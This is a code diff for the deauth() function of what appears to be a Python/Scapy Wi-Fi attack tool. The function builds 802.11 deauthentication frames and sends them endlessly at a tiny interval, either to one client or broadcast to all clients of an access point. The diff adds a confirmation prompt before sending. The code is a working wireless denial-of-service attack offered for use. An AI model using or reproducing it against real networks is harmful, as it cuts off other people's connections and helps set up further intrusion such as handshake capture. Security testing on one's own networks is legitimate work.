@@ -8,7 +8,6 @@ def deauth(target_mac, gateway_mac, iface):
     # addr1: destination MAC
     # addr2: source MAC
     # addr3: Access Point MAC
-    verbose=1
     loop=1
     count=0
     inter=0.00001
@@ -17,7 +16,7 @@ def deauth(target_mac, gateway_mac, iface):
     if not 'SUDO_UID' in os.environ.keys():
         print(f'[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}')
         sys.exit()
-
+    
     try:
         if count == 0:
             # If count is equal to 0, do endless loop
@@ -27,14 +26,24 @@ def deauth(target_mac, gateway_mac, iface):
             loop = 0
 
         if target_mac.lower() == 'a':
-            dot11 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=gateway_mac, addr3=gateway_mac)
+            target_mac = 'ff:ff:ff:ff:ff:ff'
+            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
         else:
             dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
 
-        # Stack them up
-        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-        # Send the packet
-        sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=0)
+        choice = input(f'[{Fore.GREEN}+{Style.RESET_ALL}] Target MAC: {Fore.GREEN}{target_mac}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Gateway MAC: {Fore.GREEN}{gateway_mac}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Interface: {Fore.GREEN}{iface}{Style.RESET_ALL}\nDo you wish to continue? [Y/N]: ')
+
+        if choice.lower() == 'y':
+
+            # Stack them up
+            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+            # Send the packet
+            sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=0)
+        
+        else:
+            print('Operation was cancelled.')
+            sys.exit('\n')
+
     except Exception as e:
         print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
     except KeyboardInterrupt:
